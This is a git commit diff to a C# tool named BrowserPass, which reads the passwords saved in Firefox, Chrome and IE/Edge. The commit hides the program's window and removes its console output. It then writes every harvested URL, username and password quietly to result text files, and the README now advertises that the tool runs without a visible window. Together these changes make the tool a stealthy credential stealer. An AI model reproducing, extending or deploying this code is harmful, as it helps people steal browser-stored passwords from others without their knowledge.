98a5e3be61ca5ff0f0a7117fe70f27acc70891da
InheritedDamage <dennis.zajonz@udo.edu>
2021-01-14 00:01:24 +0100

    Hiding the application window now. No console output available anymore. The application now creates result files of *.txt and writes all results to it. Furthermore added a simple logging routine.

--- BrowserPass/Program.cs
+++ BrowserPass/Program.cs
@@ -1,5 +1,19 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+
+/**
+ * 
+ *  Author: jabiel - Jarek Bielicki
+ *  Author: NoStudioDude - Rui Nunes
+ * 
+ *  Improvements by InheritedDamage
+ * 
+ **/
+
 
 namespace BrowserPass
 {
@@ -7,36 +21,85 @@ namespace BrowserPass
     // or check path to Windows.winmd in csproj file
     class Program
     {
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
         static void Main(string[] args)
         {
-            List<IPassReader> readers = new List<IPassReader>();
-            readers.Add(new FirefoxPassReader());
-            readers.Add(new ChromePassReader());
-            readers.Add(new IE10PassReader());
+            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
+            ShowWindow(h, 0);
 
-            foreach (var reader in readers)
-            {
-                Console.WriteLine($"== {reader.BrowserName} ============================================ ");
-                try
+            using (StreamWriter sw = new StreamWriter(String.Concat(Directory.GetCurrentDirectory(), @"\\log.txt"), true)) {
+                List<IPassReader> readers = new List<IPassReader>();
+                sw.WriteLine("Retrieving Firefox passwords ...");
+                readers.Add(new FirefoxPassReader());
+                sw.WriteLine("Retrieving Chrome passwords ...");
+                readers.Add(new ChromePassReader());
+                sw.WriteLine("Retrieving IE10/Edge passwords ...");
+                readers.Add(new IE10PassReader());
+
+                sw.WriteLine("Create result file ...");
+                String filePath = CreateNewResFileWithDate();
+                sw.WriteLine($"result file name: {filePath}");
+
+                foreach (var reader in readers)
                 {
-                    PrintCredentials(reader.ReadPasswords());
+                    sw.WriteLine($"writing {reader.BrowserName} passwords to result file ...");
+                    try
+                    {
+                        WriteCredentials(reader.ReadPasswords(), filePath);
+                    }
+                    catch (Exception ex)
+                    {
+                        sw.WriteLine($"ERROR reading {reader.BrowserName} passwords: " + ex.Message);
+                    }
                 }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"Error reading {reader.BrowserName} passwords: " + ex.Message);
-                }
+                sw.WriteLine("done\r\n");
             }
 
 #if DEBUG
             Console.ReadLine();
 #endif
-
+            System.Environment.Exit(0);
         }
 
         static void PrintCredentials(IEnumerable<CredentialModel> data)
         {
             foreach (var d in data)
                 Console.WriteLine($"{d.Url}\r\n\tU: {d.Username}\r\n\tP: {d.Password}\r\n");
+        }
+
+        static void WriteCredentials(IEnumerable<CredentialModel> data, String resFilePath) {
+            String path = Directory.GetCurrentDirectory();
+            using (StreamWriter sw = File.AppendText(resFilePath))
+            {
+                foreach (var d in data)
+                    sw.WriteLine($"{d.Url}\r\nuser= {d.Username}\r\npass= {d.Password}\r\n");
+                sw.Close();
+            }
+        }
+
+        static String GetCurrentDate() {
+            DateTime localDate = DateTime.Now;
+            return localDate.ToString("MMM yyyy");
+        }
+
+        static String CreateNewResFileWithDate() {
+            String path = Directory.GetCurrentDirectory();
+            int i = 1;
+            String fileprefix = "\\result_";
+            String filesuffix = ".txt";
+            while (File.Exists(String.Concat(path, fileprefix, i.ToString(), filesuffix)))
+                i++;
+            String filepath = String.Concat(path, fileprefix, i.ToString(), filesuffix);
+
+            using (StreamWriter sw =
+            new StreamWriter(filepath, true)) {
+                sw.WriteLine($"{GetCurrentDate()}\r\n");
+                sw.Close();
+            }
+
+            return filepath;
         }
     }
 }
--- README.md
+++ README.md
@@ -1,6 +1,7 @@
 # BrowserPass
 Retrieves passwords stored in browsers written in pure C#
-
+The application doesn't show a window. There is no console output.
+All results are stored in a .txt file.
 
 Supported browsers:
 * Chrome
